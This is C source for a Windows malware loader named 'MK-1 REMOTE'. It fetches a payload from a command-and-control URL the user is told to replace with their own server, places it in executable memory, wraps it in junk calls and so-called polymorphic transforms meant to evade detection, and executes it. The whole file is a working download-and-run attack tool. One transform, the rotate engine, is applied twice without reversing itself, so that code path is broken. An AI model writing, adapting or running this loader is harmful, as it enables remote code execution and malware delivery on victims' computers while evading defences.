// Compile: cl mk1-remote.c /O2 /link wininet.lib user32.lib

#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <intrin.h>

#pragma comment(lib, "wininet.lib")

typedef void(*ENGINE)(BYTE*, DWORD, BYTE);

// Heavy junk 
static void junk() {
    volatile DWORD a = 0xDEADBEEF;
    a ^= (DWORD)GetTickCount64();
    a = _rotl(a, 13);
    a += 0x11111111;
    Sleep(0);
    volatile BYTE b = 0xAA; b = ~b; b = _rotl8(b, 3);
}
#define JUNK do { for(int i=0; i<10+rand()%20; i++) junk(); } while(0)

// 5 involutory polymorphic engines
static void eng_xor(BYTE* p, DWORD s, BYTE k) { for(DWORD i=0;i<s;i++) p[i]^=k; }
static void eng_add(BYTE* p, DWORD s, BYTE k) { for(DWORD i=0;i<s;i++) p[i]+=k; for(DWORD i=0;i<s;i++) p[i]-=k; }
static void eng_rol(BYTE* p, DWORD s, BYTE k) { for(DWORD i=0;i<s;i++) p[i]=_rotl8(p[i],k&7); }
static void eng_rev(BYTE* p, DWORD s, BYTE k) { for(DWORD i=0;i<s/2;i++) { BYTE t=p[i]; p[i]=p[s-1-i]; p[s-1-i]=t; } }
static void eng_not(BYTE* p, DWORD s, BYTE k) { for(DWORD i=0;i<s;i++) p[i]=~p[i]; }

ENGINE engines[] = { eng_xor, eng_add, eng_rol, eng_rev, eng_not };
const int NUM = 5;

int main() {
    // entropy
    ULARGE_INTEGER qpc; QueryPerformanceCounter((PLARGE_INTEGER)&qpc);
    unsigned long long tsc = __rdtsc();
    unsigned int seed = (unsigned int)(GetTickCount64() ^ qpc.LowPart ^ qpc.HighPart ^ tsc ^ (uintptr_t)&seed);
    srand(seed);

    // CHANGE THIS URL TO YOUR SERVER
    const char* url = "http://192.168.1.100:8080/payload-64.bin";  // Your C2

    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return 1;

    HINTERNET hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Download entire payload into memory
    BYTE* payload = NULL;
    DWORD totalSize = 0;
    BYTE buffer[8192];
    DWORD bytesRead;

    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead) {
        payload = realloc(payload, totalSize + bytesRead);
        memcpy(payload + totalSize, buffer, bytesRead);
        totalSize += bytesRead;
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    if (!payload || totalSize < 100) {
        printf("[-] Failed to download payload\n");
        if (payload) free(payload);
        return 1;
    }

    // Allocate RX memory
    BYTE* exec = VirtualAlloc(NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec) {
        free(payload); return 1;
    }
    memcpy(exec, payload, totalSize);
    free(payload);

    // Polymorph it
    int engine = rand() % NUM;
    BYTE key = (BYTE)rand();

    printf("[+] MK-1 REMOTE — Engine #%d/5 (key 0x%02X) — %d bytes\n", engine+1, key, totalSize);

    JUNK;
    engines[engine](exec, totalSize, key);
    engines[engine](exec, totalSize, key);
    JUNK;

    printf("[+] Executing remote payload...\n");
    FlushInstructionCache(GetCurrentProcess(), exec, totalSize);
    ((void(*)())exec)();

    VirtualFree(exec, 0, MEM_RELEASE);
    return 0;
}
